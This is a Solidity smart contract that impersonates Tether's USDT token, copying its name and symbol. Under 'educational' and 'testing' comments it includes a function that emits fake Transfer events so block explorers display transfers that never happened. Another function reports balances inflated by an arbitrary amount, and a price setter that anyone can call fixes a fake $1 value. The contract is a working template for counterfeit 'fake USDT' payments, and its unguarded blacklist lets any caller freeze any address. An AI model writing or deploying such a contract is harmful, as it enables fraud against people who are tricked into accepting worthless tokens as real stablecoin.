// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

contract TetherUSDT {
    string public name = "Tether USD";
    string public symbol = "USDT";
    uint8 public decimals = 6;
    uint256 public totalSupply = 500000000000;

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    mapping(address => bool) public isBlacklisted;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Blacklist(address indexed account, bool isBlacklisted);

    // Fake price for educational purposes
    uint256 public Price = 1e6; // $1 per token

    constructor() {
        balanceOf[msg.sender] = totalSupply;
        emit Transfer(address(0), msg.sender, totalSupply); // Emit event for initial token allocation
    }

    modifier notBlacklisted(address _address) {
        require(!isBlacklisted[_address], "Address is blacklisted");
        _;
    }

    function transfer(address _to, uint256 _value) public notBlacklisted(msg.sender) notBlacklisted(_to) returns (bool success) {
        require(balanceOf[msg.sender] >= _value, "Insufficient balance");
        balanceOf[msg.sender] -= _value;
        balanceOf[_to] += _value;
        emit Transfer(msg.sender, _to, _value);
        return true;
    }

    function approve(address _spender, uint256 _value) public notBlacklisted(msg.sender) returns (bool success) {
        allowance[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }

    function transferFrom(address _from, address _to, uint256 _value) public notBlacklisted(_from) notBlacklisted(_to) returns (bool success) {
        require(balanceOf[_from] >= _value, "Insufficient balance");
        require(allowance[_from][msg.sender] >= _value, "Allowance exceeded");
        balanceOf[_from] -= _value;
        allowance[_from][msg.sender] -= _value;
        balanceOf[_to] += _value;
        emit Transfer(_from, _to, _value);
        return true;
    }

    function blacklistAddress(address _account, bool _status) public returns (bool) {
        isBlacklisted[_account] = _status;
        emit Blacklist(_account, _status);
        return true;
    }

    function burn(uint256 _value) public notBlacklisted(msg.sender) returns (bool) {
        require(balanceOf[msg.sender] >= _value, "Insufficient balance to burn");
        balanceOf[msg.sender] -= _value;
        totalSupply -= _value;
        emit Transfer(msg.sender, address(0), _value);
        return true;
    }

    // Simulated Price Function
    function getPrice() public view returns (uint256) {
        return Price; // Returns $1 as the token price
    }

    // Update  Price (for testing purposes)
    function setPrice(uint256 _newPrice) public {
        Price = _newPrice; // Allow changing the fake price dynamically
    }

    // Emit Fake Transfer Events
    function emitTransferEvent(address _to, uint256 _value) public {
        emit Transfer(msg.sender, _to, _value); // Logs a transfer event for visibility in explorers
    }

    // Simulate Dynamic Balance
    function balanceOfWithValue(address account) public view returns (uint256) {
        uint256 realBalance = balanceOf[account];
        return realBalance + (Price / 10); // Adds an arbitrary value to simulate dynamic balance
    }
}